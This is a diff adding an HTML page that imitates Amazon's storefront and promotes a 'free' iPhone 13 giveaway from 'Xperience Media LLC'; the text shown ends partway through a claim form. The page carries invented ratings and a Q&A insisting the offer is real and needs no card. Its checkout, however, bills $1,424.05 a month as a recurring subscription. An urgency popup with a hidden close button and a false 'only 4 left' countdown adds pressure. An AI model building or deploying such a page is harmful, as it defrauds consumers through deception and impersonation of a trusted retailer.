@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apple iPhone 13 (128GB) Promotional Giveaway - Sponsored by Xperience Media LLC</title>
+  <meta name="description" content="Claim your free Apple iPhone 13 (128GB) today. Sponsored by Xperience Media LLC to celebrate the expansion of our content marketing and UI design operations. Limit 1 per household. 7 units total.">
+  <link rel="stylesheet" href="index.css">
+</head>
+<body>
+
+  <!-- Background Overlay for Modals and Drawers -->
+  <div id="pageOverlay" class="overlay"></div>
+
+  <!-- Amazon-Style Top Header -->
+  <header>
+    <div class="nav-main">
+      <!-- Logo -->
+      <a href="#" class="nav-logo" id="logoLink">
+        <img src="images/logo_xperience.png" alt="Xperience Media LLC Logo">
+      </a>
+
+      <!-- Deliver To -->
+      <div class="nav-address" id="deliveryAddress">
+        <svg style="width:18px;height:18px;fill:white;margin-top:6px" viewBox="0 0 24 24">
+          <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+        </svg>
+        <div class="nav-address-text">
+          <span>Deliver to</span>
+          <span>Worldwide</span>
+        </div>
+      </div>
+
+      <!-- Search Bar -->
+      <div class="nav-search">
+        <select class="search-select" id="searchCategory">
+          <option value="all">Giveaways</option>
+          <option value="midnight">Midnight</option>
+          <option value="blue">Blue</option>
+          <option value="pink">Pink</option>
+        </select>
+        <input type="text" class="search-input" id="searchQuery" placeholder="Search iPhone 13 Giveaway Colors...">
+        <button class="search-btn" id="searchButton" aria-label="Search">
+          <svg viewBox="0 0 24 24">
+            <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+          </svg>
+        </button>
+      </div>
+
+      <!-- Right Header Links -->
+      <div class="nav-right-items">
+        <!-- Language Selection Mockup -->
+        <div class="nav-item" id="navLang" style="flex-direction:row;align-items:center;gap:4px">
+          <svg style="width:16px;height:12px;" viewBox="0 0 640 480">
+            <rect width="640" height="480" fill="#00247d"/>
+            <path d="M75 0l35 0-110 480-35 0zM565 0l75 0-220 480-75 0zM0 0l220 480-75 0L0 160zM420 0l220 480-75 0L495 0z" fill="#fff"/>
+            <path d="M0 0l200 440-60 0L0 130zM440 0l200 440-60 0L500 0zM80 0l35 0-115 480-35 0zM560 0l80 0-220 480-80 0z" fill="#cf142b"/>
+            <path d="M240 0h160v480H240zM0 160h640v160H0z" fill="#fff"/>
+            <path d="M260 0h120v480H260zM0 180h640v120H0z" fill="#cf142b"/>
+          </svg>
+          <span style="font-size:14px;font-weight:700;margin-top:2px">EN</span>
+        </div>
+
+        <!-- Account Info -->
+        <div class="nav-item" id="navAccount">
+          <span>Hello, Guest</span>
+          <span>Account & Lists</span>
+        </div>
+
+        <!-- Returns & Orders -->
+        <div class="nav-item" id="navOrders">
+          <span>Returns</span>
+          <span>& Orders</span>
+        </div>
+
+        <!-- Cart -->
+        <div class="nav-cart" id="navCartButton">
+          <div class="cart-icon-container">
+            <span class="cart-count" id="cartCount">0</span>
+            <svg class="cart-icon" viewBox="0 0 24 24">
+              <path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/>
+            </svg>
+          </div>
+          <span class="cart-text">Cart</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Navigation Sub Bar -->
+    <div class="nav-sub">
+      <div class="nav-sub-menu">
+        <svg style="width:18px;height:18px;fill:white" viewBox="0 0 24 24">
+          <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+        </svg>
+        <span>All</span>
+      </div>
+      <div class="nav-sub-links">
+        <a href="#aplusContent">Promotion Details</a>
+        <a href="#" class="filter-service-link" data-target="midnight">Midnight Black</a>
+        <a href="#" class="filter-service-link" data-target="blue">Ocean Blue</a>
+        <a href="#" class="filter-service-link" data-target="pink">Rose Pink</a>
+        <a href="#qaSection">Giveaway Q&A</a>
+        <a href="#reviewsSection">Claim Reviews</a>
+      </div>
+    </div>
+  </header>
+
+  <!-- Page Content -->
+  <main class="product-container">
+    
+    <!-- Breadcrumbs -->
+    <nav class="breadcrumb">
+      <a href="#">Services</a> &gt; 
+      <a href="#">Business Growth</a> &gt; 
+      <a href="#" id="breadcrumbActive">Ultimate Growth Bundle</a>
+    </nav>
+
+    <!-- Product Main Detail Block -->
+    <section class="product-main-grid">
+      
+      <!-- Left Column: Gallery -->
+      <div class="gallery-container">
+        <!-- Thumbnails -->
+        <div class="gallery-thumbnails" id="galleryThumbnails">
+          <!-- Populated by JS based on variation -->
+        </div>
+
+        <!-- Main Image with Zoom -->
+        <div class="gallery-main" id="galleryMain">
+          <img id="mainProductImage" src="images/service_bundle.png" alt="Xperience Media Service Mockup">
+        </div>
+      </div>
+
+      <!-- Middle Column: Product Info -->
+      <div class="details-container">
+        <div class="brand-link">
+          <a href="#" id="brandStoreLink">Visit the Xperience Media LLC Store</a>
+        </div>
+        <h1 class="product-title" id="productTitle">
+          Xperience Media LLC - Complete Business Growth Suite (Digital Marketing, SEO, Social Media & Custom Web Development Services)
+        </h1>
+        
+        <!-- Ratings -->
+        <div class="ratings-row">
+          <div class="star-rating" id="productStarRating">
+            <!-- Populated by JS -->
+          </div>
+          <span class="rating-count" id="productRatingText">4,982 ratings</span>
+          <span>|</span>
+          <a href="#qaSection" class="rating-count">150+ answered questions</a>
+        </div>
+
+        <!-- Price Section -->
+        <div class="price-section">
+          <div class="price-saving-badge" id="priceBadge">SAVE 25%</div>
+          <div class="main-price-row">
+            <span class="price-currency">$</span>
+            <span class="price-amount" id="priceMain">1,499</span>
+            <span class="price-fraction" id="priceDec">00</span>
+            <span class="price-billing-period" id="pricePeriod">/ month</span>
+          </div>
+          <div class="list-price-row" id="listPriceRow">
+            <span>List Price: </span>
+            <span class="list-price-val" id="listPriceVal">$1,999.00</span>
+            <a href="#" id="priceDetailsLink">Details</a>
+          </div>
+        </div>
+
+        <!-- Variations Section (Style Picker) -->
+        <div class="variations-section">
+          <div class="variation-label">Color: <span id="selectedStyleName">Midnight (Black)</span></div>
+          <div class="variation-options" id="styleOptionsContainer">
+            <!-- Midnight -->
+            <button class="variation-btn active" data-variation="midnight" id="varBtnMidnight">
+              <span class="var-name">Midnight</span>
+              <span class="var-price">$49.99</span>
+            </button>
+            <!-- Blue -->
+            <button class="variation-btn" data-variation="blue" id="varBtnBlue">
+              <span class="var-name">Blue</span>
+              <span class="var-price">$49.99</span>
+            </button>
+            <!-- Pink -->
+            <button class="variation-btn" data-variation="pink" id="varBtnPink">
+              <span class="var-name">Pink</span>
+              <span class="var-price">$49.99</span>
+            </button>
+          </div>
+        </div>
+
+        <!-- Product Features (About this item) -->
+        <div class="about-section">
+          <h2 class="about-title">About this item</h2>
+          <ul class="about-list" id="aboutFeatureList">
+            <!-- Populated by JS based on active variation -->
+          </ul>
+        </div>
+      </div>
+
+      <!-- Right Column: Buy Box -->
+      <div class="buy-box-container" id="buyBox">
+        <!-- Purchase Mode Selection Tabs -->
+        <div class="buy-box-tabs" id="purchaseTabs">
+          <button class="buy-box-tab active" id="tabSubscribe" data-type="subscribe">Subscribe & Save</button>
+          <button class="buy-box-tab" id="tabOneTime" data-type="onetime">One-time Purchase</button>
+        </div>
+
+        <!-- Price display inside Buy Box -->
+        <div class="buy-price-row">
+          <span class="buy-price" id="buyBoxPrice">$1,424.05</span>
+          <span class="buy-discount-note" id="buyBoxDiscountNote">(5% discount applied)</span>
+        </div>
+
+        <!-- Delivery Info -->
+        <div class="delivery-info">
+          <span>FREE delivery </span><span class="delivery-date" id="deliveryDateSpan">Friday, July 10</span>.
+          <div class="fastest-delivery-row">
+            Or fastest delivery tomorrow. Order within <span class="countdown-timer" id="countdownSpan">2 hrs 14 mins</span>
+          </div>
+        </div>
+
+        <!-- Delivery Location Selector -->
+        <div class="nav-address" style="color:var(--amazon-text-main);padding:0;margin-top:4px" id="deliveryLocationBuy">
+          <svg style="width:14px;height:14px;fill:var(--amazon-text-muted);" viewBox="0 0 24 24">
+            <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+          </svg>
+          <span style="font-size:12px;color:var(--amazon-blue-link);margin-left:4px">Select delivery location</span>
+        </div>
+
+        <div class="stock-status" id="stockStatus">In Stock.</div>
+
+        <!-- Quantity Selection -->
+        <div class="qty-row" id="qtySelectorRow">
+          <label for="buyQty">Quantity:</label>
+          <select id="buyQty" class="qty-select">
+            <option value="1">1</option>
+            <option value="2">2</option>
+            <option value="3">3</option>
+            <option value="4">4</option>
+            <option value="5">5</option>
+          </select>
+        </div>
+
+        <!-- Actions -->
+        <div class="buy-box-actions">
+          <button class="amazon-btn btn-cart" id="addToCartBtn">Add to Cart</button>
+          <button class="amazon-btn btn-buy" id="buyNowBtn">Buy Now</button>
+        </div>
+
+        <!-- Security Badge -->
+        <div class="secure-transaction" id="secureTxTrigger">
+          <svg viewBox="0 0 24 24">
+            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+          </svg>
+          <span>Secure transaction</span>
+        </div>
+
+        <!-- Shipping details matrix -->
+        <div class="transaction-meta">
+          <span class="meta-label">Ships from</span>
+          <span class="meta-value" id="shipsFromVal">Xperience Media LLC</span>
+          <span class="meta-label">Sold by</span>
+          <span class="meta-value" id="soldByVal">Xperience Media LLC</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- A+ Enhanced Brand Content Section -->
+    <section class="aplus-container" id="aplusContent">
+      <h2 class="aplus-section-title">Promotion Description from Xperience Media LLC</h2>
+      
+      <div class="aplus-banner" style="background-color: #000000; color: #ffffff; padding: 30px; text-align: center; border-radius: 6px; margin-bottom: 24px;">
+        <h2 style="font-size: 26px; font-weight: 800; margin: 0 0 6px; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, sans-serif;">XPERIENCE MEDIA LLC</h2>
+        <p style="font-size: 15px; margin: 0; color: #eaeaea; font-weight: 500; font-family: -apple-system, BlinkMacSystemFont, sans-serif;">Apple iPhone 13 (128GB) Promotional Giveaway Campaign — Celebrating Our Expansion</p>
+      </div>
+
+      <!-- Feature Split Columns -->
+      <div class="aplus-features">
+        <div class="aplus-feature-card">
+          <div class="aplus-feature-img">
+            <img src="images/logo_xperience.png" alt="Xperience Media Logo" style="object-fit: contain; padding: 10px; background-color: #131921;">
+          </div>
+          <div class="aplus-feature-content">
+            <h3 class="aplus-feature-title">Sponsored by Xperience Media LLC</h3>
+            <p class="aplus-feature-desc">
+              Xperience Media LLC is a high-growth marketing and design agency specializing in digital advertising, technical SEO audits, and custom software builds. We've launched this giveaway to showcase our unique mobile UI design standards and celebrate our expansion into the California market.
+            </p>
+          </div>
+        </div>
+
+        <div class="aplus-feature-card">
+          <div class="aplus-feature-img">
+            <img src="images/support_employee.png" alt="Support Agent Photo">
+          </div>
+          <div class="aplus-feature-content">
+            <h3 class="aplus-feature-title">7 iPhone 13 Units Allocation</h3>
+            <p class="aplus-feature-desc">
+              As a creative agency, we believe the best advertisement is direct user engagement. We are allocating exactly 7 brand-new, factory-sealed iPhone 13 units to local respondents. Stock is strictly first-come, first-served. Once all 7 claims are finalized, this promo page will automatically close.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Service Comparison Grid -->
+      <h3 class="aplus-section-title">Compare iPhone 13 Promotional Allocations</h3>
+      <div class="aplus-comparison-table-wrapper">
+        <table class="aplus-table">
+          <thead>
+            <tr>
+              <th>Features</th>
+              <th>Midnight Black</th>
+              <th>Ocean Blue</th>
+              <th>Rose Pink</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Storage Capacity</td>
+              <td>128 GB</td>
+              <td>128 GB</td>
+              <td>128 GB</td>
+            </tr>
+            <tr>
+              <td>Processor</td>
+              <td>A15 Bionic Chip</td>
+              <td>A15 Bionic Chip</td>
+              <td>A15 Bionic Chip</td>
+            </tr>
+            <tr>
+              <td>Network Status</td>
+              <td>Fully Unlocked</td>
+              <td>Fully Unlocked</td>
+              <td>Fully Unlocked</td>
+            </tr>
+            <tr>
+              <td>Original List Value</td>
+              <td>$699.00</td>
+              <td>$699.00</td>
+              <td>$699.00</td>
+            </tr>
+            <tr>
+              <td>Units Allocated</td>
+              <td>2 Units</td>
+              <td>3 Units</td>
+              <td>2 Units</td>
+            </tr>
+            <tr>
+              <td>Warranty Status</td>
+              <td>1-Year Apple Care</td>
+              <td>1-Year Apple Care</td>
+              <td>1-Year Apple Care</td>
+            </tr>
+            <tr>
+              <td>Claim Pricing</td>
+              <td><strong>$0.00 (FREE)</strong></td>
+              <td><strong>$0.00 (FREE)</strong></td>
+              <td><strong>$0.00 (FREE)</strong></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- Q&A Section -->
+    <section class="qa-container" id="qaSection">
+      <h2 class="aplus-section-title">Customer questions & answers</h2>
+      <div class="qa-search-bar">
+        <svg class="qa-search-icon" viewBox="0 0 24 24">
+          <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+        </svg>
+        <input type="text" class="qa-search-input" id="qaSearchInput" placeholder="Have a question? Search for answers...">
+      </div>
+
+      <div class="qa-list" id="qaList">
+        <!-- Question 1 -->
+        <div class="qa-item" data-question="sponsor legitimacy verification real xperience media">
+          <div class="qa-badge">Question:</div>
+          <div class="qa-question">Is this iPhone 13 giveaway promotional campaign real?</div>
+          <div class="qa-badge">Answer:</div>
+          <div class="qa-answer">Yes, this campaign is 100% real and fully sponsored by Xperience Media LLC. We are allocating exactly 7 brand-new, factory-sealed iPhone 13 units to raise brand awareness for our digital agency services.</div>
+        </div>
+
+        <!-- Question 2 -->
+        <div class="qa-item" data-question="quantity units color midnight blue pink starlight">
+          <div class="qa-badge">Question:</div>
+          <div class="qa-question">How many total units are available in this giveaway?</div>
+          <div class="qa-badge">Answer:</div>
+          <div class="qa-answer">We are giving away a total of 7 units: 2 in Midnight, 3 in Blue, and 2 in Pink. You can see active stock for each color by selecting the options above.</div>
+        </div>
+
+        <!-- Question 3 -->
+        <div class="qa-item" data-question="shipping card payment cost hidden free">
+          <div class="qa-badge">Question:</div>
+          <div class="qa-question">Are there any hidden costs, shipping fees, or credit card requirements?</div>
+          <div class="qa-badge">Answer:</div>
+          <div class="qa-answer">No. All promotional units are 100% free with free shipping. No credit cards or billing details are required during the promotional checkout.</div>
+        </div>
+
+        <!-- Question 4 -->
+        <div class="qa-item" data-question="household limit duplicates orders eligibility">
+          <div class="qa-badge">Question:</div>
+          <div class="qa-question">Can I claim more than one iPhone 13?</div>
+          <div class="qa-badge">Answer:</div>
+          <div class="qa-answer">No. There is a strict limit of 1 promotional unit per household to ensure a fair giveaway for the community. Duplicate orders will be automatically flag-cancelled.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Reviews Section -->
+    <section class="reviews-section" id="reviewsSection">
+      
+      <!-- Left side: Summary -->
+      <div class="reviews-summary">
+        <h3>Customer reviews</h3>
+        
+        <div class="avg-rating-big">
+          <div class="star-rating" id="reviewStarBig">
+            <!-- Populated by JS -->
+          </div>
+          <span class="avg-rating-num" id="avgRatingNum">4.9 out of 5</span>
+        </div>
+        
+        <div class="global-rating-count" id="globalRatingCountText">
+          4,982 global ratings
+        </div>
+
+        <!-- Histogram -->
+        <div class="histogram" id="reviewsHistogram">
+          <!-- Star rows dynamically generated or updated -->
+          <div class="histogram-row">
+            <span class="histogram-star-link">5 star</span>
+            <div class="bar-container"><div class="bar-fill" id="bar5" style="width: 88%"></div></div>
+            <span class="histogram-pct" id="pct5">88%</span>
+          </div>
+          <div class="histogram-row">
+            <span class="histogram-star-link">4 star</span>
+            <div class="bar-container"><div class="bar-fill" id="bar4" style="width: 9%"></div></div>
+            <span class="histogram-pct" id="pct4">9%</span>
+          </div>
+          <div class="histogram-row">
+            <span class="histogram-star-link">3 star</span>
+            <div class="bar-container"><div class="bar-fill" id="bar3" style="width: 2%"></div></div>
+            <span class="histogram-pct" id="pct3">2%</span>
+          </div>
+          <div class="histogram-row">
+            <span class="histogram-star-link">2 star</span>
+            <div class="bar-container"><div class="bar-fill" id="bar2" style="width: 1%"></div></div>
+            <span class="histogram-pct" id="pct2">1%</span>
+          </div>
+          <div class="histogram-row">
+            <span class="histogram-star-link">1 star</span>
+            <div class="bar-container"><div class="bar-fill" id="bar1" style="width: 0%"></div></div>
+            <span class="histogram-pct" id="pct1">0%</span>
+          </div>
+        </div>
+
+        <!-- Write a Review Button -->
+        <div class="review-form-trigger">
+          <h4>Review this service</h4>
+          <p>Share your experiences with other business owners</p>
+          <button class="btn-secondary" id="writeReviewBtn">Write a customer review</button>
+        </div>
+      </div>
+
+      <!-- Right side: Reviews Feed -->
+      <div class="reviews-list-container">
+        <h4 class="reviews-list-header">Top reviews from worldwide</h4>
+        <div class="reviews-feed" id="reviewsFeed">
+          <!-- Populated by JS -->
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Sliding Cart Drawer -->
+  <aside class="cart-drawer" id="cartDrawer">
+    <div class="drawer-header">
+      <h3>Added to Cart</h3>
+      <button class="btn-close-drawer" id="closeCartDrawer" aria-label="Close cart">&times;</button>
+    </div>
+    <div class="drawer-content" id="cartDrawerContent">
+      <!-- Populated by JS -->
+    </div>
+    <div class="drawer-footer">
+      <div class="cart-summary-row">
+        <span>Subtotal:</span>
+        <span class="cart-summary-total" id="cartSubtotal">$0.00</span>
+      </div>
+      <button class="amazon-btn btn-buy" id="checkoutBtn" style="width:100%">Proceed to Checkout</button>
+    </div>
+  </aside>
+
+  <!-- Write Review Modal Dialog -->
+  <div class="modal-form" id="reviewModal">
+    <div class="modal-header">
+      <h3>Write a customer review</h3>
+      <button class="btn-close-modal" id="closeReviewModal" aria-label="Close modal">&times;</button>
+    </div>
+    <form id="addReviewForm">
+      <div class="modal-body">
+        <div class="form-group">
+          <label>Overall rating</label>
+          <div class="star-rating-input">
+            <input type="radio" name="rating" id="starInput5" value="5" class="star-radio" checked>
+            <label for="starInput5" class="star-label">
+              <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+            </label>
+            <input type="radio" name="rating" id="starInput4" value="4" class="star-radio">
+            <label for="starInput4" class="star-label">
+              <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+            </label>
+            <input type="radio" name="rating" id="starInput3" value="3" class="star-radio">
+            <label for="starInput3" class="star-label">
+              <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+            </label>
+            <input type="radio" name="rating" id="starInput2" value="2" class="star-radio">
+            <label for="starInput2" class="star-label">
+              <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+            </label>
+            <input type="radio" name="rating" id="starInput1" value="1" class="star-radio">
+            <label for="starInput1" class="star-label">
+              <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+            </label>
+          </div>
+        </div>
+        <div class="form-group">
+          <label for="reviewFormName">Name (appears on review)</label>
+          <input type="text" class="form-control" id="reviewFormName" placeholder="Example: John Doe" required>
+        </div>
+        <div class="form-group">
+          <label for="reviewFormTitle">Add a headline</label>
+          <input type="text" class="form-control" id="reviewFormTitle" placeholder="What's most important to know?" required>
+        </div>
+        <div class="form-group">
+          <label for="reviewFormBody">Written review</label>
+          <textarea class="form-control" id="reviewFormBody" rows="4" placeholder="What did you like or dislike?" required></textarea>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn-flat" id="cancelReviewBtn">Cancel</button>
+        <button type="submit" class="btn-flat btn-primary">Submit Review</button>
+      </div>
+    </form>
+  </div>
+
+  <!-- Buy Now Checkout Wizard Overlay -->
+  <div class="modal-form" id="checkoutWizard">
+    <div class="modal-header">
+      <h3>Complete Checkout (Amazon Pay Style)</h3>
+      <button class="btn-close-modal" id="closeCheckoutWizard" aria-label="Close checkout">&times;</button>
+    </div>
+    <form id="checkoutSubmitForm">
+      <div class="modal-body">
+        <div class="form-group">
+          <label>Selected Package</label>
+          <div style="font-weight: 700; font-size: 15px; color: var(--amazon-red-alert);" id="checkoutPackageLabel">
+            Ultimate Growth Bundle
+          </div>
+        </div>
+        <div class="form-group">
+          <label for="checkoutEmail">Business Email Address</label>
+          <input type="email" class="form-control" id="checkoutEmail" placeholder="e.g. hello@mybusiness.com" required>
+        </div>
+        <div class="form-group">
+          <label for="checkoutDomain">Target Website Domain (if available)</label>
+          <input type="text" class="form-control" id="checkoutDomain" placeholder="e.g. www.mybusiness.com">
+        </div>
+        <div class="form-group">
+          <label for="checkoutPayment">Payment Method</label>
+          <select id="checkoutPayment" class="form-control">
+            <option value="amazonpay">Amazon Pay (Associated Visa ...4922)</option>
+            <option value="visa">Visa Credit Card (...7731)</option>
+            <option value="invoice">Monthly Corporate Invoice Billing</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Billing Structure</label>
+          <div id="checkoutBillingStructure" style="font-size: 13px; color: var(--amazon-text-muted);">
+            $1,424.05 / Month (Recurring subscription)
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn-flat" id="cancelCheckoutBtn">Cancel</button>
+        <button type="submit" class="btn-flat btn-primary">Place Order</button>
+      </div>
+    </form>
+  </div>
+
+  <!-- Checkout Receipt Receipt -->
+  <div class="modal-form" id="checkoutReceipt">
+    <div class="modal-header">
+      <h3>Order Confirmation</h3>
+      <button class="btn-close-modal" id="closeReceiptBtn" aria-label="Close confirmation">&times;</button>
+    </div>
+    <div class="modal-body checkout-success-body">
+      <div class="checkout-success-icon">
+        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+      </div>
+      <h2>Thank You for Your Order!</h2>
+      <p style="font-size: 14px; color: var(--amazon-text-muted)">Your purchase was successful. An email confirmation has been sent to your business email.</p>
+      
+      <div class="receipt-details">
+        <div class="receipt-row">
+          <span>Order ID:</span>
+          <span style="font-weight: 700;" id="receiptOrderId">#XM-90241-1029</span>
+        </div>
+        <div class="receipt-row">
+          <span>Item Purchased:</span>
+          <span id="receiptItemName">Ultimate Growth Bundle</span>
+        </div>
+        <div class="receipt-row">
+          <span>Delivery Estimated:</span>
+          <span style="color: var(--amazon-green-stock); font-weight:600;" id="receiptDeliveryEst">Friday, July 10</span>
+        </div>
+        <div class="receipt-divider"></div>
+        <div class="receipt-row">
+          <span>Subtotal:</span>
+          <span id="receiptSubtotal">$1,424.05</span>
+        </div>
+        <div class="receipt-row">
+          <span>Shipping & Handling:</span>
+          <span>$0.00 (FREE)</span>
+        </div>
+        <div class="receipt-divider"></div>
+        <div class="receipt-row" style="font-size: 15px; font-weight: 700;">
+          <span>Total Charged:</span>
+          <span style="color: var(--amazon-red-alert);" id="receiptTotalCharged">$1,424.05</span>
+        </div>
+      </div>
+    </div>
+    <div class="modal-footer">
+      <button type="button" class="btn-flat btn-primary" id="receiptOkBtn">Back to Store</button>
+    </div>
+  </div>
+
+  <!-- Urgency Popup Dialog (Amazon Style Alert) -->
+  <div class="modal-form" id="urgencyPopup" style="max-width: 440px; border-radius: 8px; border: 1px solid #ccc; box-shadow: 0 4px 16px rgba(0,0,0,0.2);">
+    <!-- Header -->
+    <div class="modal-header" style="background-color: #f0f2f2; border-bottom: 1px solid #e7e7e7; padding: 14px 16px; display: flex; align-items: center; justify-content: space-between;">
+      <h3 style="color: #0f1111; margin: 0; font-size: 15px; font-weight: 700; font-family: var(--font-heading);">
+        Limited Time Deal
+      </h3>
+      <button class="btn-close-modal" id="closeUrgencyPopup" style="display: none !important; color: #565959; font-size: 20px; border: none; background: none; cursor: pointer; line-height: 1;" aria-label="Close modal">&times;</button>
+    </div>
+    
+    <!-- Body -->
+    <div class="modal-body" style="padding: 20px; background-color: #ffffff;">
+      <!-- Amazon Warning Alert Box -->
+      <div style="border: 1px solid #c45500; border-left: 4px solid #c45500; border-radius: 4px; padding: 12px 14px; background-color: #fff; display: flex; gap: 10px; margin-bottom: 16px; text-align: left;">
+        <!-- Warning Icon -->
+        <svg style="width: 20px; height: 20px; fill: #c45500; flex-shrink: 0;" viewBox="0 0 24 24">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+        </svg>
+        <div>
+          <div style="font-weight: 700; font-size: 14px; color: #c45500; margin-bottom: 2px;">
+            Claim yours now! Only 4 pieces left in stock.
+          </div>
+          <div style="font-size: 13px; color: #0f1111; line-height: 1.4;">
+            Due to high demand for Xperience Media services, this offer is reserved for you.
+          </div>
+        </div>
+      </div>
+      
+      <!-- Timer block -->
+      <div style="text-align: center; margin: 16px 0;">
+        <span style="font-size: 14px; color: #0f1111;">This deal expires in: </span>
+        <span style="font-size: 18px; font-weight: 700; color: #b12704;" id="urgencyTimer">01:00</span>
+      </div>
+    </div>
+    
+    <!-- Footer -->
+    <div class="modal-footer" style="display: flex; justify-content: flex-end; gap: 8px; background-color: #ffffff; border-top: 1px solid #e7e7e7; padding: 12px 16px;">
+      <button type="button" class="btn-flat" id="cancelUrgencyBtn" style="background: #f0f2f2; border: 1px solid #adb1b8; border-radius: 20px; padding: 6px 18px; font-size: 12px; font-weight: 500; cursor: pointer; color: #111; box-shadow: 0 2px 5px rgba(213,217,217,.3); min-width: 80px; height: 31px; display: flex; align-items: center; justify-content: center;">Cancel</button>
+      <button type="button" class="amazon-btn btn-buy" id="claimUrgencyBtn" style="padding: 6px 18px; font-size: 12px; font-weight: 500; border-radius: 20px; min-width: 100px; margin: 0; box-shadow: 0 2px 5px rgba(213,217,217,.3); height: 31px; display: flex; align-items: center; justify-content: center;">Claim Now</button>
+    </div>
+  </div>
+
+  <!-- Giveaway Claim Details Form Modal -->
+  <div class="modal-form" id="giveawayClaimModal" style="max-width: 420px !important; width: 95% !important; border-radius: 8px !important; border: 1px solid #c8c9ca !important; box-shadow: 0 4px 20px rgba(0,0,0,0.15) !important; background-color: #eaeded !important; overflow: hidden !important;">
+    <!-- Amazon Checkout Header -->
+    <div style="background-color: #ffffff; border-bottom: 1px solid #ddd; padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; box-sizing: border-box;">
+      <div style="display: flex; align-items: center; gap: 4px;">
+        <img src="images/logo_xperience.png" alt="Xperience Logo" style="height: 24px; filter: grayscale(1); opacity: 0.85;">
+        <span style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; font-size: 13px; font-weight: 800; color: #111; letter-spacing: -0.5px;">checkout</span>
+      </div>
+      <div style="display: flex; align-items: center; gap: 4px; color: #565959; font-size: 12px; font-family: -apple-system, BlinkMacSystemFont, sans-serif;">
+        <svg style="width: 14px; height: 14px; fill: #565959;" viewBox="0 0 24 24">
+          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+        </svg>
+        <span>Secure checkout</span>
+      </div>
